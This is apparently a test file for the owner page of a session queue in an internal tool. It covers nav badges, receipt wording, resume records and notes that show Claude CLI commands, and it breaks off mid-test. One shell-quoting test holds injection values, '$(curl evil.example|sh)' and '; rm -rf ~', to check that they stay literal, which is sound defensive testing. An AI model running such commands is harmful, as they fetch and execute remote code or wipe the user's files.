// Queue owner page: the nav slot, card precedence text, resume records and the card controls, read from the shipped
// queue.jsx through test/lib/render-screen.ts.
// "spec §N" in this file = the Queue desk design spec, clauded-docs 44063 (Atrium Monitor documents, outside the repo).
//
// Runner: npx tsx --test test/queue.owner-page.client.test.ts

import test, { describe } from "node:test";
import assert from "node:assert/strict";
import { randomUUID } from "node:crypto";
import vm from "node:vm";
import { fileURLToPath } from "node:url";
import { dirname, resolve } from "node:path";
import { imageUploadQuerySchema, messageBodySchema, ownerOrdersQuerySchema, replyBodySchema } from "../src/server/queue/schemas.js";
import { getImageFacts } from "../src/server/queue/image-format.js";
import { IMAGE_BYTES_MAX } from "../src/server/queue/images.js";
import { getLineDisplay, getLineHash } from "../src/server/queue/scan-approvals.js";
import { collectText, createEffectReact, createFakeDocument, createStatefulReact, findNodes, loadScreenModule, renderScreen, type RenderedNode } from "./lib/render-screen.js";
import { FIXTURE_NOW, FIXTURE_SESSION_IDS, getRelayThreadFixture } from "./lib/queue-render-fixtures.js";

const __dirname = dirname(fileURLToPath(import.meta.url));
const QUEUE_SRC = resolve(__dirname, "../public/src/screens/queue.jsx");
const UI_SRC = resolve(__dirname, "../public/src/ui.jsx");
const realUiModule = (await loadScreenModule(UI_SRC)) as { UI: Record<string, unknown>; React: { createElement: (t: unknown, p: unknown) => unknown } };
const realUi = realUiModule.UI;
const realUiReact = realUiModule.React;

// the rail's box is read as the input assistive technology meets → the shared Checkbox renders for real
const REAL_ATOMS = new Set(["Checkbox"]);

// window.UI stub — components resolve to transparent host elements; helpers and constants stay real.
function uiStub(): unknown {
  return new Proxy(
    {},
    {
      get: (_target, name: string) =>
        (!/^[A-Z][a-z]/.test(name) || REAL_ATOMS.has(name)) && name in realUi
          ? realUi[name]
          : Object.defineProperty((props: Record<string, unknown>) => ({ __element: true, type: "ui-atom", props: { ...props, atom: name } }), "name", {
              value: name,
            }),
      has: () => true,
    },
  );
}

type Component = (props: unknown) => unknown;
interface ScreenModule {
  React: { createElement: (t: unknown, p: unknown, ...children: unknown[]) => unknown };
  [name: string]: unknown;
}

const screen = (await loadScreenModule(QUEUE_SRC, {
  URLSearchParams,
  window: { UI: uiStub(), location: { hash: "#queue" }, history: { replaceState: () => undefined } },
})) as ScreenModule;
// vm-realm values → this realm's prototypes, so deepEqual compares content
const getPlain = <T>(value: T): T => (value === undefined ? value : JSON.parse(JSON.stringify(value)));
const call = <T>(name: string, ...args: unknown[]): T => getPlain((screen[name] as (...a: unknown[]) => T)(...args));
const render = (name: string, props: unknown): RenderedNode => renderScreen(screen.React.createElement(screen[name] as Component, props)) as RenderedNode;
// spec §12.6: a sentence the page shows holds at most 12 words — a command or id counts as one, a lone mark (`·`, `/`, `+`) as none
const SENTENCE_WORDS_MAX = 12;
const getLongSentences = (texts: string[]) => texts.flatMap((text) => text.split(/(?<=[.?!])\s+/)).filter((sentence) => sentence.split(/\s+/).filter((word) => /[\p{L}\p{N}<]/u.test(word)).length > SENTENCE_WORDS_MAX);
const getNoteText = (parts: Array<string | { machine: string }>) => parts.map((part) => (typeof part === "string" ? part : "<command>")).join("");

const SESSION_ID = "6f1c2a9e-4b7d-4e21-9a3f-0c5d8e7b1a42";
const CLI_PATH = "/Volumes/tools/atrium/scripts/atrium-queue.sh";
const READY_RESUMES = { status: "ready", data: [], error: null, busy: false };

function buildSession(overrides: Record<string, unknown> = {}) {
  return {
    id: SESSION_ID,
    name: "glass-atrium",
    isNameRegistered: true,
    profileLabel: "work-dev",
    cwd: "/Users/owner/Desktop/git/glass-atrium",
    cwdTail: "git/glass-atrium",
    configDir: null,
    state: "exited",
    isWaiting: false,
    permissionHint: "default",
    marker: null,
    ...overrides,
  };
}

function buildItem(overrides: Record<string, unknown> = {}) {
  return {
    id: 41,
    kind: "decision",
    title: "Pick the migration order",
    body: "Two orders keep the shadow DB green.",
    linkedDocIds: [],
    options: [
      { code: "R1", label: "Schema first", pros: "one deploy", cons: "longer lock" },
      { code: "R2", label: "Data first", pros: "short lock", cons: "two deploys" },
    ],
    recommendedCode: "R2",
    isFreeTextAllowed: true,
    isApprovalClass: false,
    status: "open",
    queuePosition: 7,
    deferCount: 0,
    nextAttempt: 1,
    answer: { code: null, text: null },
    askedAt: "2026-11-10T06:12:43.518Z",
    answeredAt: null,
    deliveredAt: null,
    session: buildSession(),
    resumes: [],
    deviation: null,
    skipReason: null,
    canResend: false,
    ...overrides,
  };
}

function buildQueue(overrides: Record<string, unknown> = {}) {
  const calls: unknown[][] = [];
  const record = (name: string) => (...args: unknown[]) => calls.push([name, ...args]);
  return {
    calls,
    queue: {
      busy: { id: null, error: null },
      resumes: READY_RESUMES,
      readResumes: record("readResumes"),
      drafts: {},
      setDraft: record("setDraft"),
      later: record("later"),
      send: record("send"),
      answerItem: record("answerItem"),
      settle: record("settle"),
      selectRow: record("selectRow"),
      sessions: buildSessions(),
      orders: buildOrders({ focus: record("focusOrders") }),
      reload: record("reload"),
      back: record("back"),
      list: { status: "ready", data: { items: [], nextCursor: null }, newIds: [] },
      done: { thread: { status: "ready", hasRead: true, items: [], nextCursor: null, error: null, refusals: [] }, read: record("readDone"), showEarlier: record("moreDone"), reread: record("rereadDone") },
      relays: { thread: { status: "ready", hasRead: true, items: [], nextCursor: null, error: null, refusals: [], refusalCutAt: null }, read: record("readRelays"), showEarlier: record("moreRelays"), reread: record("rereadRelays") },
      steps: { index: 0, count: 1, prevId: null, nextId: null },
      sheet: { kind: "none", id: null },
      ...overrides,
    },
  };
}

// the queue with a loaded list, its bands and the first row selected, as useQueueStateQ hands it to the desk
function withList(queue: Record<string, unknown>, items: unknown[], nextCursor: number | null = null) {
  const groups = call<Array<{ rows: Array<{ id: number }> }>>("getGroupsQ", items);
  return { ...queue, list: { status: "ready", data: { items, nextCursor }, newIds: [] }, filter: { profile: "" }, setFilter: () => undefined, groups, sheet: getSheet(groups, ""), selectedId: groups[0]?.rows[0]?.id ?? null, status: "" };
}

const getSheet = (groups: unknown, hashId: string) => call<{ id: number | null }>("getSheetStateQ", groups, hashId, null);

// the sheet is its own card markup → one tree holds its head, body and foot
const renderSheet = (props: unknown): RenderedNode => render("ItemSheetQ", props);
const byClass = (tree: RenderedNode, name: string) => findNodes(tree, (node) => String(node.props?.className ?? "").split(" ").includes(name));

// spec §5's block forms in one text: headings, three list levels, a table, a quote, a rule, a fence, a link and an image link
const EVERY_BLOCK_FORM = [
  "# 배포 65 결과", "### 세부", "- 첫째 **꼭**", "  - 둘째", "    - 셋째", "1. 번호", "| 항목 | 값 |", "|---|--:|", "| 테스트 | 3280 |",
  "> 인용한 줄", "---", "```", "const limit = 30;", "```", "[인계 문서](clauded-docs/39703) ![화면](https://example.com/a.png)",
].join("\n");
// each as-sent element's content: one string child in a dir="auto" element, else what stands in its place
const getAsSentTexts = (tree: RenderedNode) => byClass(tree, "prose-text--as-sent").map((node) => {
  const [child, ...rest] = node.children ?? [];
  if (node.props.dir !== "auto") return "no dir=auto";
  return typeof child === "string" && rest.length === 0 ? child : `${(node.children ?? []).length} children`;
});

const buttonLabelled = (tree: RenderedNode, label: string) => findNodes(tree, (node) => node.type === "button" && collectText(node).trim() === label);

describe("queue nav slot", () => {
  const ready = (awaiting: number, deviations: number) => ({ status: "ready", data: { awaiting, deviations, oldestAgeSeconds: 120 } });
  const rows = [
    { name: "a count never read gives no slot, so no zero that was not loaded", countState: { status: "loading" }, expected: undefined },
    { name: "an unread count shows a question mark rather than a blank badge", countState: { status: "error" }, expected: ["?"] },
    { name: "nothing awaiting and nothing deviating gives no slot", countState: ready(0, 0), expected: undefined },
    { name: "deviations and items awaiting draw two counts, the deviations first", countState: ready(2, 1), expected: ["1", "2"] },
    { name: "deviations with nothing awaiting draw the deviation count alone", countState: ready(0, 3), expected: ["3"] },
    { name: "a count answer without numbers reads as unread", countState: { status: "ready", data: { rows: [] } }, expected: ["?"] },
  ];
  for (const row of rows) {
    test(row.name, () => {
      const slot = call<{ queue?: { badges: Array<{ badge: string; icon?: string }> } }>("getQueueNavBadge", row.countState);
      assert.deepEqual(slot.queue?.badges.map((badge) => badge.icon ?? badge.badge), row.expected);
    });
  }

  // one glyph names one number: only the deviation count is toned; each count's title is its spoken description
  const WARN_GLYPH = (realUi.TONE_GLYPH as Record<string, string>).warn;
  const factRows = [
    { name: "one of each", countState: ready(1, 1), expected: [["warn", WARN_GLYPH, "1 deviation open"], [undefined, undefined, "1 queue item awaiting you"]] },
    { name: "many of each", countState: ready(4, 2), expected: [["warn", WARN_GLYPH, "2 deviations open"], [undefined, undefined, "4 queue items awaiting you"]] },
    { name: "a failed read", countState: { status: "error" }, expected: [[undefined, undefined, "Queue count unavailable"]] },
  ];
  for (const row of factRows) {
    test(`each queue nav count names its own fact: ${row.name}`, () => {
      type Count = { badgeTone?: string; glyph?: string; title: string; description: string };
      const { badges } = call<{ queue: { badges: Count[] } }>("getQueueNavBadge", row.countState).queue;
      assert.deepEqual(badges.map((b) => [b.badgeTone, b.glyph, b.description]), row.expected);
      assert.deepEqual(badges.map((b) => b.title), badges.map((b) => b.description));
    });
  }

  // a background tab shows what waits; a count of nothing, or one not read, adds nothing to the title
  const titleRows = [
    { name: "items awaiting lead the title with their count", countState: ready(7, 0), expected: "(7) Queue · Atrium Monitor" },
    { name: "nothing awaiting leaves the count out", countState: ready(0, 0), expected: "Queue · Atrium Monitor" },
    { name: "a count not read yet leaves the count out", countState: { status: "loading" }, expected: "Queue · Atrium Monitor" },
    { name: "a failed count read leaves the count out", countState: { status: "error", data: { awaiting: 3, deviations: 0 } }, expected: "Queue · Atrium Monitor" },
  ];
  for (const row of titleRows) {
    test(`document title: ${row.name}`, () => assert.equal(call("getQueueTitle", row.countState, "Atrium Monitor"), row.expected));
  }
});

describe("Later", () => {
  test("Later moves the item to the end and keeps the others in queue order", () => {
    const items = [buildItem({ id: 1 }), buildItem({ id: 2, kind: "report" }), buildItem({ id: 3 })];
    const ids = (list: Array<{ id: number }>) => list.map((item) => item.id);
    assert.deepEqual(ids(call("putLaterQ", items, 1)), [2, 3, 1]);
    assert.deepEqual(ids(call("putLaterQ", items, 2)), [1, 3, 2]);
  });

  const kinds = [
    { name: "a decision's sheet offers Answer later", kind: "decision", label: "Answer later" },
    { name: "a report's sheet offers Read later", kind: "report", label: "Read later" },
  ];
  for (const row of kinds) {
    test(row.name, () => {
      const { calls, queue } = buildQueue();
      const tree = renderSheet({ item: buildItem({ id: 9, kind: row.kind }), queue });
      const [later] = buttonLabelled(tree, row.label);
      assert.ok(later, "Later button rendered");
      (later.props.onClick as () => void)();
      assert.deepEqual(getPlain(calls), [["later", 9]]);
    });
  }
});

describe("after Send the next awaiting item is found in list order", () => {
  const items = [buildItem({ id: 1 }), buildItem({ id: 2, status: "answered" }), buildItem({ id: 3 }), buildItem({ id: 4 })];
  const rows = [
    { name: "skips a row no longer awaiting", id: 1, expected: 3 },
    { name: "wraps to the first awaiting row from the last", id: 4, expected: 1 },
    { name: "no other awaiting row leaves the focus where it is", id: 1, list: [buildItem({ id: 1 }), buildItem({ id: 2, status: "answered" })], expected: null },
  ];
  for (const row of rows) test(row.name, () => assert.equal(call("getNextAwaitingIdQ", row.list ?? items, row.id), row.expected));
});

test("after Send the next open item the active filter shows takes the sheet, in band order", async () => {
  const module = (await loadScreenModule(QUEUE_SRC, {
    window: { UI: uiStub() },
    fetch: async () => ({ status: 200, json: async () => ({ ok: true }) }),
  })) as ScreenModule;
  const personal = buildSession({ id: "9b2e7c41-0d3a-4c55-8e1f-2a6b9c4d7e10", profileLabel: "personal" });
  const items = [buildItem({ id: 1 }), buildItem({ id: 4, kind: "report" }), buildItem({ id: 2, session: personal }), buildItem({ id: 3 })];
  const opened: unknown[] = [];
  const actions = (module.useQueueActionsQ as (deps: unknown) => { answerItem: (id: number, body: unknown) => Promise<void> })({
    groups: call("getGroupsQ", call("getVisibleItemsQ", items, { profile: "work-dev" })),
    setList: () => undefined,
    setDrafts: () => undefined,
    setStatus: () => undefined,
    openItem: (id: unknown) => opened.push(["open", id]),
    closeSheet: () => opened.push(["close"]),
    reload: () => undefined,
  });
  await actions.answerItem(1, { code: "R1" });
  assert.deepEqual(getPlain(opened), [["open", 3]]);
});

test("a draft held in page state reappears when its item is selected again", () => {
  const { queue } = buildQueue({ drafts: { 41: { text: "keep the shadow DB" } } });
  const tree = renderSheet({ item: buildItem(), queue });
  const [field] = findNodes(tree, (node) => node.type === "textarea");
  assert.equal(field?.props.value, "keep the shadow DB");
});

// one word per recipient: received, not yet, or — only when the queue recorded it did not get there — not received
describe("receipt words", () => {
  // the facts render as a list of siblings → held in one host element, as the letterhead's slot holds them
  const factsText = (item: unknown) => collectText(renderScreen(screen.React.createElement("p", null, screen.React.createElement(screen.LetterheadFactsQ as Component, { item }))) as RenderedNode);
  const rows = [
    { name: "an acknowledged order is received", item: { status: "delivered", deliveredAt: "2026-11-12T12:28:04.311Z" }, word: "Received" },
    { name: "an answer waiting for its pull is not yet received", item: { status: "answered" }, word: "Not yet" },
    { name: "an order handed over and not acknowledged yet is not yet received", item: { status: "delivering" }, word: "Not yet" },
    { name: "a held order is not yet received", item: { status: "held", deviation: "held" }, word: "Not yet" },
    { name: "an order whose automatic resume is still to come is not yet received", item: { status: "resume_pending", deviation: "resume_pending" }, word: "Not yet" },
    { name: "an order its session never acknowledged is not received", item: { status: "unacked", deviation: "unacked", canResend: true }, word: "Not received" },
    { name: "an unacknowledged order is not received while its session is marked for a resume", item: { status: "unacked", deviation: "unacked" }, word: "Not received" },
    { name: "an expired order is not received", item: { status: "expired", deviation: "expired", canResend: true }, word: "Not received" },
    { name: "an order whose automatic resume is used is not received", item: { status: "resume_pending", deviation: "resume_pending", canResend: true }, word: "Not received" },
    { name: "an answer to a live session that listens is not yet received", item: { status: "answered", session: buildSession({ state: "live", isWaiting: true }) }, word: "Not yet" },
    { name: "an answer to a live session that does not listen waits for its next turn", item: { status: "answered", session: buildSession({ state: "live", isWaiting: false }) }, word: "Next turn" },
    { name: "an answer to a not-reachable session is not reachable", item: { status: "answered", deviation: "session_not_reachable", session: buildSession({ state: "stale", isWaiting: false }) }, word: "Not reachable" },
    { name: "a held copy whose session does not listen waits for its next turn", item: { status: "held", deviation: "held", session: buildSession({ state: "live", isWaiting: false }) }, word: "Next turn" },
    { name: "a copy being handed over stays not yet whatever its session's last poll", item: { status: "delivering", session: buildSession({ state: "live", isWaiting: false }) }, word: "Not yet" },
    { name: "an ended session's answer, which an automatic resume will start, stays not yet", item: { status: "answered", session: buildSession({ state: "exited", isWaiting: false }) }, word: "Not yet" },
    { name: "a failure the queue recorded outranks a next turn", item: { status: "unacked", deviation: "unacked", canResend: true, session: buildSession({ state: "live", isWaiting: false }) }, word: "Not received" },
  ];
  const WORDS = [/\bReceived\b/, /Not yet/, /Next turn/, /Not reachable/, /Not received/];
  for (const row of rows) {
    test(row.name, () => {
      const item = buildItem({ kind: "message", answeredAt: "2026-11-12T12:26:40.118Z", ...row.item });
      const text = factsText(item);
      assert.deepEqual(WORDS.filter((word) => word.test(text)).map((word) => word.source.replace(/\\b/g, "")), [row.word], text);
    });
  }

  // spec §9.4: the same tag fill as Not yet, with a pause glyph before its word and the sentence in its title, never as visible text
  test("a not-listening receipt is the tag badge led by the solid pause glyph, its sentence in its title and for screen readers only", () => {
    const tree = render("RowFactsQ", { facts: [call("getReceiptFactQ", "nextTurn")] });
    const [badge] = findNodes(tree, (node) => node.props?.atom === "Badge");
    const [svg] = findNodes(badge as RenderedNode, (node) => node.type === "svg");
    // two bars filled in the badge's ink, no outline
    const bars = findNodes(svg as RenderedNode, (node) => node.type === "rect" && node.props.fill === "currentColor" && node.props.stroke === undefined);
    // the glyph, then the word, then the spoken sentence
    const [spoken] = findNodes(badge as RenderedNode, (node) => node.props?.className === "sr-only");
    assert.deepEqual(
      { fill: badge?.props.fill, title: badge?.props.title, glyph: bars.length, order: (badge?.children ?? []).map((child) => (typeof child === "string" ? child : (child.props?.atom ?? child.type))), spoken: collectText(spoken as RenderedNode) },
      { fill: "tag", title: "Next turn — delivers at its next turn end or restart", glyph: 2, order: ["svg", "Next turn", "span"], spoken: ", delivers at its next turn end or restart" },
    );
  });

  test("no surface names a deviation by its queue status", () => {
    const words = /Unacked|Held|Expired|Resume pending|Session not reachable|Delivery off/;
    for (const status of ["unacked", "held", "expired", "resume_pending"]) {
      const item = buildItem({ kind: "message", status, deviation: status, answeredAt: "2026-11-12T12:26:40.118Z" });
      const text = `${factsText(item)} ${collectText(render("CardStateQ", { item, cliPath: CLI_PATH }))}`;
      assert.doesNotMatch(text, words, text);
    }
  });

  // spec §4.2, §9.4: the fact column reads received of sent; the tag column counts what is not plain waiting, worst first
  const rollUps = [
    { name: "some copies received counts them", statuses: ["delivered", "answered", "delivering"], cells: { fact: "1 of 3", tags: [] } },
    { name: "every copy waiting reads none received and draws no tag", statuses: ["answered", "delivering", "held"], cells: { fact: "0 of 3", tags: [] } },
    { name: "a copy not received is counted in the tag column", statuses: ["delivered", "unacked", "answered"], cells: { fact: "1 of 3", tags: ["1 not received"] } },
    { name: "two copies whose sessions do not listen are counted in the tag column", statuses: ["answered:deaf", "answered:deaf"], cells: { fact: "0 of 2", tags: ["2 next turn"] } },
    { name: "a mixed order counts only the copy whose session does not listen", statuses: ["answered:listening", "answered:deaf"], cells: { fact: "0 of 2", tags: ["1 next turn"] } },
    { name: "not received stands before next turn", statuses: ["delivered", "answered:deaf", "unacked"], cells: { fact: "1 of 3", tags: ["1 not received", "1 next turn"] } },
  ];
  // `status:deaf` → a live session that does not listen · `status:listening` → one that does · bare → an ended session
  const SESSION_OF: Record<string, Record<string, unknown>> = { deaf: { state: "live", isWaiting: false }, listening: { state: "live", isWaiting: true } };
  for (const row of rollUps) {
    test(`an order to several sessions rolls up its receipts: ${row.name}`, () => {
      const copies = row.statuses.map((entry, index) => {
        const [status, listen] = entry.split(":");
        return buildItem({ id: 90 + index, kind: "message", status, sendId: "send-1", answeredAt: "2026-11-12T12:26:40.118Z", session: buildSession({ id: randomUUID(), ...SESSION_OF[listen ?? ""] }) });
      });
      const cells = call<{ fact: string; tags: Array<{ word: string }> }>("getRowCellsQ", { item: copies[0], copies }, false);
      assert.deepEqual({ fact: cells.fact, tags: cells.tags.map((tag) => tag.word) }, row.cells);
    });
  }
});

describe("sheet state lines", () => {

  // an answered item waits for its session's pull → the owner learns whether a wait takes it, else how to pull it
  const pullRows = [
    { name: "a live session that listens picks the answer up on its own", status: "answered", session: { state: "live", isWaiting: true }, isWaitNamed: true, isDeafNamed: false, hasCommand: false },
    { name: "a live session that does not listen says so, then shows the pull command", status: "answered", session: { state: "live", isWaiting: false }, isWaitNamed: false, isDeafNamed: true, hasCommand: true },
    { name: "a not-reachable session that does not listen says so, with no pull command", status: "answered", session: { state: "stale", isWaiting: false }, isWaitNamed: false, isDeafNamed: true, hasCommand: false },
    { name: "an ended session is resumed, so no line shows", status: "answered", session: { state: "exited", isWaiting: false }, isWaitNamed: false, isDeafNamed: false, hasCommand: false },
    { name: "an unanswered item has nothing to pull", status: "open", session: { state: "live", isWaiting: false }, isWaitNamed: false, isDeafNamed: false, hasCommand: false },
  ];
  const DEAF_LINE = "glass-atrium gets this answer at its next turn. Restart it to deliver now.";
  for (const row of pullRows) {
    test(`pull line: ${row.name}`, () => {
      const text = collectText(render("CardStateQ", { item: buildItem({ status: row.status, session: buildSession(row.session) }), cliPath: CLI_PATH }));
      assert.equal(text.includes("The session is listening"), row.isWaitNamed, text);
      assert.equal(text.includes(DEAF_LINE), row.isDeafNamed, text);
      assert.equal(text.includes(`${CLI_PATH} pending`), row.hasCommand, text);
      if (row.isDeafNamed && row.hasCommand) assert.ok(text.indexOf(DEAF_LINE) < text.indexOf(`${CLI_PATH} pending`), text);
    });
  }

  const ANSWERED_AT = "2026-11-12T04:05:17.482Z";
  const answered = (overrides: Record<string, unknown>) => buildItem({ status: "delivered", answeredAt: ANSWERED_AT, isAnsweredOutside: false, ...overrides });
  // the record names when, by which route and on which request signal, in the letterhead time's title; only an unrecorded answer is a visible, flagged line
  const answerRows = [
    { name: "an answer on fetch metadata", item: answered({ answerRecord: { route: "answer", signal: "fetch_metadata" } }), words: ["Answered", "same-origin request"], isFlagged: false },
    { name: "a reply on the Origin header alone", item: answered({ kind: "report", answerRecord: { route: "reply", signal: "origin" } }), words: ["Replied", "Origin header"], isFlagged: false },
    { name: "an owner message", item: answered({ answerRecord: { route: "message", signal: "fetch_metadata" } }), words: ["Sent as a message"], isFlagged: false },
    { name: "an answer from before the record", item: answered({ answerRecord: { route: "answer", signal: "before_record" } }), words: ["Answered", "before answers were recorded"], isFlagged: false },
    { name: "an answer with no record", item: answered({ answerRecord: null, isAnsweredOutside: true }), words: ["Answered outside the Queue page"], isFlagged: true },
  ];
  for (const row of answerRows) {
    test(`answer record line: ${row.name}`, () => {
      const tree = render("CardStateQ", { item: row.item });
      const [time] = findNodes(render("LetterheadTimeQ", { item: row.item }), (node) => typeof node.props?.title === "string");
      const text = row.isFlagged ? collectText(tree) : String(time?.props.title);
      for (const word of row.words) assert.ok(text.includes(word), text);
      assert.ok(text.includes("2026-11-12 13:05 KST"), text);
      assert.equal(findNodes(tree, (node) => /\btext-warn\b/.test(String(node.props?.className ?? ""))).length, row.isFlagged ? 1 : 0, text);
    });
  }

  test("an item with no answer carries no answer record line", () => {
    const text = collectText(render("CardStateQ", { item: buildItem({ answerRecord: null, isAnsweredOutside: false }) }));
    assert.doesNotMatch(text, /Answered|Replied|Sent as/);
  });

  test("an approval-class decision's approval line says an approving answer approves the stated action once, with no terminal step, and describes Send answer", () => {
    const foot = (item: unknown) => render("SheetFootQ", { item, draft: {}, queue: buildQueue().queue, isBusy: false, error: null });
    const tree = foot(buildItem({ isApprovalClass: true }));
    const [line] = byClass(tree, "queue-approval-line");
    const [send] = buttonLabelled(tree, "Send answer");
    assert.equal(collectText(line as RenderedNode).replace(/\s+/g, " ").trim(), "ℹ Approval: approving here approves the action once. glass-atrium does not ask again in its terminal.");
    assert.doesNotMatch(collectText(tree), /confirm once more/);
    assert.deepEqual([send?.props["aria-describedby"], byClass(foot(buildItem()), "queue-approval-line").length], [(line as RenderedNode).props.id, 0]);
  });
});

describe("sheet precedence notes", () => {
  const occupant = { profileLabel: "personal", cwdTail: "wt/owner-queue", sessionIdPrefix: "9b2e7c41" };
  // a note's parts: a string is prose, { machine } renders through MachineString
  const markedLine = [
    "Waiting on personal · wt/owner-queue · ",
    { machine: "9b2e7c41" },
    ", whose resume has not registered. This one waits until that session registers or is resumed. It resumes by itself once that session ends.",
  ];
  const generic = ["another session is live or resuming in this worktree. This one resumes once it ends."];
  const capturedIdNote = [
    "It may still run under profile work-dev. Check it: ",
    { machine: "claude logs bg-7f3a" },
    ". Resume it in a terminal only after ",
    { machine: "claude stop bg-7f3a" },
    ".",
  ];
  const markedSession = (bgId: string | null, configDir: string | null = null) =>
    buildSession({ marker: { setAt: "2026-11-10T06:20:11.204Z", bgId }, configDir });
  const pending = (skipReason: unknown, extra: Record<string, unknown> = {}) => buildItem({ status: "resume_pending", skipReason, ...extra });
  const rows = [
    { name: "a used attempt asks for Resend", item: pending({ kind: "resume_used" }), expected: [["automatic resume used — Resend to try again"]] },
    { name: "a resume in flight shows no text", item: pending({ kind: "in_flight" }), expected: [] },
    { name: "no marked occupant gives the generic worktree line", item: pending({ kind: "shared_worktree", markedOccupants: [], hasUnmarkedOccupant: true }), expected: [generic] },
    { name: "a marked occupant is named", item: pending({ kind: "shared_worktree", markedOccupants: [occupant], hasUnmarkedOccupant: false }), expected: [markedLine] },
    {
      name: "a marked and a live occupant give the marked line then the generic line",
      item: pending({ kind: "shared_worktree", markedOccupants: [occupant], hasUnmarkedOccupant: true }),
      expected: [markedLine, generic],
    },
    { name: "the captured-id marker form names the bg id and the profile", item: pending({ kind: "marker" }, { session: markedSession("bg-7f3a") }), expected: [capturedIdNote] },
    {
      name: "the listing marker form names the cwd",
      item: pending({ kind: "marker" }, { session: markedSession(null) }),
      expected: [
        [
          "It may still run under profile work-dev. Find it: ",
          { machine: "claude agents --json --cwd /Users/owner/Desktop/git/glass-atrium" },
          ". Resume it in a terminal once it is gone, or after ",
          { machine: "claude stop <id>" },
          ".",
        ],
      ],
    },
    {
      name: "the marker on an unacked card of a marked session replaces any skip text",
      item: buildItem({ status: "unacked", deviation: "unacked", session: markedSession("bg-7f3a") }),
      expected: [capturedIdNote],
    },
  ];
  for (const row of rows) test(row.name, () => assert.deepEqual(call("getCardNotesQ", row.item), row.expected));

  const configRows = [
    { name: "captured-id form carries the recorded config dir in each command", bgId: "bg-7f3a" },
    { name: "listing form carries the recorded config dir in each command", bgId: null },
  ];
  for (const row of configRows) {
    test(row.name, () => {
      const [note] = call<Array<Array<string | { machine: string }>>>("getCardNotesQ", buildItem({ session: markedSession(row.bgId, "/Users/owner/.claude-work-dev") }));
      const commands = (note ?? []).flatMap((part) => (typeof part === "string" || !part.machine.includes("claude ") ? [] : [part.machine]));
      assert.equal(commands.length, 2, String(commands));
      for (const command of commands) assert.ok(command.startsWith("CLAUDE_CONFIG_DIR=/Users/owner/.claude-work-dev claude "), command);
    });
  }

  // POSIX single-quote form: a value outside the plain-path set → one literal word, never expanded or split
  const shellWordRows = [
    { name: "a plain path stays bare", value: "/Users/owner/Desktop/git/glass-atrium", shellWord: "/Users/owner/Desktop/git/glass-atrium" },
    { name: "a space keeps the path one word", value: "/Users/owner/My Repos/app", shellWord: "'/Users/owner/My Repos/app'" },
    { name: "command substitution stays literal", value: "/tmp/x$(curl evil.example|sh)", shellWord: "'/tmp/x$(curl evil.example|sh)'" },
    { name: "a command separator stays literal", value: "/tmp/a; rm -rf ~", shellWord: "'/tmp/a; rm -rf ~'" },
    { name: "a backtick stays literal", value: "/tmp/`id`", shellWord: "'/tmp/`id`'" },
    { name: "an embedded single quote closes, escapes and reopens", value: "/tmp/it's", shellWord: "'/tmp/it'\\''s'" },
  ];
  for (const row of shellWordRows) {
    test(`every value a rendered command carries is shell-quoted: ${row.name}`, () => {
      const listing = call<Array<string | { machine: string }>[]>("getCardNotesQ", buildItem({ session: markedSession(null, row.value) }))[0] ?? [];
      const listed = buildItem({ session: { ...markedSession(null), cwd: row.value } });
      const [cwdCommand] = (call<Array<string | { machine: string }>[]>("getCardNotesQ", listed)[0] ?? []).flatMap((part) => (typeof part === "string" ? [] : [part.machine]));
      const captured = call<Array<string | { machine: string }>[]>("getCardNotesQ", buildItem({ session: markedSession(row.value) }))[0] ?? [];
      const pull = collectText(render("CardStateQ", { item: buildItem({ status: "answered", session: buildSession({ state: "live" }) }), cliPath: row.value }));
      assert.equal(cwdCommand, `claude agents --json --cwd ${row.shellWord}`);
      assert.ok(listing.some((part) => typeof part !== "string" && part.machine.startsWith(`CLAUDE_CONFIG_DIR=${row.shellWord} claude `)), JSON.stringify(listing));
      assert.ok(captured.some((part) => typeof part !== "string" && part.machine === `claude logs ${row.shellWord}`), JSON.stringify(captured));
      assert.ok(pull.includes(`${row.shellWord} pending`), pull);
    });
  }

  test("a note's commands and ids render through MachineString and its prose carries no backticks", () => {
    const tree = render("CardStateQ", { item: pending({ kind: "marker" }, { session: markedSession("bg-7f3a") }) });
    const machine = findNodes(tree, (node) => node.props.atom === "MachineString").map((node) => collectText(node));
    assert.deepEqual(machine, ["claude logs bg-7f3a", "claude stop bg-7f3a"]);
    assert.doesNotMatch(collectText(tree), /`/);
  });

  test("a marked session with a used attempt shows the marker reason and no Resend", () => {
    const item = pending({ kind: "marker" }, { session: markedSession("bg-7f3a"), canResend: false, resumes: [{ attempt: 1, sentAt: "2026-11-10T06:20:11.204Z", result: "sent", abortReason: null, bgId: "bg-7f3a" }] });
    const tree = renderSheet({ item, queue: buildQueue().queue });
    assert.match(collectText(tree), /claude logs bg-7f3a/);
    assert.equal(buttonLabelled(tree, "Resend answer").length, 0);
  });

  test("a used attempt in a shared worktree shows the used state with Resend answer", () => {
    const item = pending({ kind: "resume_used" }, { canResend: true });
    const { calls, queue } = buildQueue();
    const tree = renderSheet({ item, queue });
    assert.match(collectText(tree), /automatic resume used — Resend to try again/);
    const [resend] = buttonLabelled(tree, "Resend answer");
    (resend?.props.onClick as () => void)();
    assert.deepEqual(getPlain(calls), [["send", 41, "resend"]]);
  });
});

describe("automatic resume record", () => {
  const rows = [
    { name: "a spawn", resume: { result: "sent", abortReason: null }, expected: "spawned" },
    { name: "a failed spawn", resume: { result: "failed", abortReason: null }, expected: "failed" },
    { name: "an abort because the session came back", resume: { result: "aborted", abortReason: "session_returned" }, expected: "not spawned: session came back" },
    { name: "an abort for a shared worktree", resume: { result: "aborted", abortReason: "shared_worktree" }, expected: "not spawned: another session in this worktree" },
  ];
  for (const row of rows) test(`result label: ${row.name}`, () => assert.equal(call("getResumeResultLabelQ", row.resume), row.expected));

  test("each card resume shows its time, account and result", () => {
    const resume = { attempt: 2, sentAt: "2026-11-10T06:20:11.204Z", result: "aborted", abortReason: "session_returned", bgId: null };
    const text = collectText(renderSheet({ item: buildItem({ status: "resume_pending", resumes: [resume] }), queue: buildQueue().queue }));
    const line = text.split("Automatic resume ")[1] ?? "";
    assert.ok(line.startsWith((realUi.formatKstDateTime as (iso: string) => string)(resume.sentAt)), line);
    assert.match(line, /work-dev · attempt 2 · not spawned: session came back/);
  });

});

describe("recent automatic resumes", () => {
  const row = (itemId: number, title: string, attempt: number, result: string) => ({
    attempt,
    sentAt: "2026-11-10T06:40:00.870Z",
    result,
    abortReason: null,
    bgId: null,
    item: { id: itemId, title },
    session: { profileLabel: ".claude-work", cwdTail: "atrium/hooks" },
  });

  test("the record lists the server's resume rows in its order, each with account, worktree and item title", () => {
